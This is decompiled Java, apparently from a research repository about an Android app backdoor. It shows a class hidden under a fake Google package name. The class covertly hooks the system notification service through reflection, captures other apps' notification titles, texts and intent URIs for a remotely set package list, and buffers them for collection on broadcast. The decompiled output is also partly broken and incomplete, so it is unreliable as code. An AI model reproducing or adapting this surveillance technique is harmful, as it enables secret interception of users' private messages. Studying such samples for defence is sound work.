package com.google.android.sd.biz_dynamic_dex.ud_notification_listener;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;
import android.os.Parcel;
import android.service.notification.StatusBarNotification;
import android.text.TextUtils;
import com.google.android.sd.utils.TrackUtils;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.Set;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public final class b {
  public static final int a = (int)(Math.random() * 2.147483647E9D);
  
  private final LinkedList<JSONObject> b = new LinkedList<JSONObject>();
  
  private final Set<String> c = new HashSet<String>();
  
  private c d;
  
  private boolean e = false;
  
  private final BroadcastReceiver f = new BroadcastReceiver(this) {
      public final void onReceive(Context param1Context, Intent param1Intent) {
        if (param1Intent.getIntExtra("from", -1) == b.a)
          return; 
        String str = param1Intent.getAction();
        if (TextUtils.equals(str, "collect_data")) {
          b.a(this.a, param1Context);
        } else if (TextUtils.equals(str, "send_data")) {
          str = param1Intent.getStringExtra("data");
          b.a(this.a, str);
        } 
        if (param1Intent.getBooleanExtra("terminate", false))
          b.b(this.a, param1Context); 
      }
    };
  
  private final c.b g = new c.b(this) {
      public final void a(StatusBarNotification param1StatusBarNotification) {
        if (b.a(this.a))
          return; 
        JSONObject jSONObject = new JSONObject();
        try {
          String str = param1StatusBarNotification.getPackageName();
          if (b.b(this.a).size() != 0) {
            if (!b.b(this.a).contains(str))
              return; 
            jSONObject.put("senderName", str);
            jSONObject.put("postTime", param1StatusBarNotification.getPostTime());
            jSONObject.put("title", (param1StatusBarNotification.getNotification()).extras.getString("android.title"));
            jSONObject.put("text", (param1StatusBarNotification.getNotification()).extras.getString("android.text"));
            PendingIntent pendingIntent = (param1StatusBarNotification.getNotification()).contentIntent;
            if (pendingIntent != null)
              jSONObject.put("intent", b.a(pendingIntent)); 
            b.a(this.a, jSONObject);
          } 
          return;
        } catch (JSONException jSONException) {
          return;
        } 
      }
    };
  
  private String a() {
    StringBuilder stringBuilder = new StringBuilder("[");
    Iterator<JSONObject> iterator = this.b.iterator();
    while (iterator.hasNext()) {
      stringBuilder.append(((JSONObject)iterator.next()).toString());
      if (iterator.hasNext())
        stringBuilder.append(","); 
    } 
    stringBuilder.append("]");
    return stringBuilder.toString();
  }
  
  private static void a(Context paramContext, boolean paramBoolean, String paramString) {
    String str;
    HashMap<Object, Object> hashMap = new HashMap<Object, Object>();
    if (paramBoolean) {
      str = "1";
    } else {
      str = "0";
    } 
    hashMap.put("status", str);
    hashMap.put("details", paramString);
    TrackUtils.submitTrack(paramContext, 260, hashMap);
  }
  
  private void a(JSONObject paramJSONObject) {
    if (this.b.size() >= 100)
      this.b.remove(); 
    this.b.add(paramJSONObject);
  }
  
  private static String b(PendingIntent paramPendingIntent) {
    try {
      Method method = paramPendingIntent.getClass().getDeclaredMethod("getIntent", new Class[0]);
      method.setAccessible(true);
      return (intent != null) ? intent.toURI() : null;
    } finally {
      paramPendingIntent = null;
    } 
  }
  
  public final void a(Context paramContext, JSONObject paramJSONObject) {
    IntentFilter intentFilter = new IntentFilter();
    intentFilter.addAction("collect_data");
    intentFilter.addAction("send_data");
    paramContext.registerReceiver(this.f, intentFilter);
    Intent intent = new Intent("collect_data");
    intent.setPackage(paramContext.getPackageName());
    intent.putExtra("from", a);
    intent.putExtra("terminate", true);
    paramContext.sendBroadcast(intent);
    JSONArray jSONArray = paramJSONObject.optJSONArray("pkg_whitelist");
    if (jSONArray != null)
      for (int i = 0; i < jSONArray.length(); i++)
        this.c.add(jSONArray.optString(i));  
    c c1 = new c();
    this.d = c1;
    try {
      c1.a = (IBinder)new c.a(this.g, c.a("android.service.notification.INotificationListener$Stub", "TRANSACTION_onNotificationPosted"));
      null = Class.forName("android.app.INotificationManager$Stub").getMethod("asInterface", new Class[] { IBinder.class }).invoke(null, new Object[] { Class.forName("android.os.ServiceManager").getMethod("getService", new Class[] { String.class }).invoke(null, new Object[] { "notification" }) });
      c1.b = (IBinder)null.getClass().getDeclaredMethod("asBinder", new Class[0]).invoke(null, new Object[0]);
      null = c1.b;
      IBinder iBinder = c1.a;
      int i = c.a();
      Parcel parcel1 = Parcel.obtain();
    } finally {
      jSONArray = null;
      a(paramContext, false, jSONArray.getMessage());
    } 
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\ab8ed4c3482c42a1b8baef558ee79deb-dex2jar.jar!\com\google\android\sd\biz_dynamic_de\\ud_notification_listener\b.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */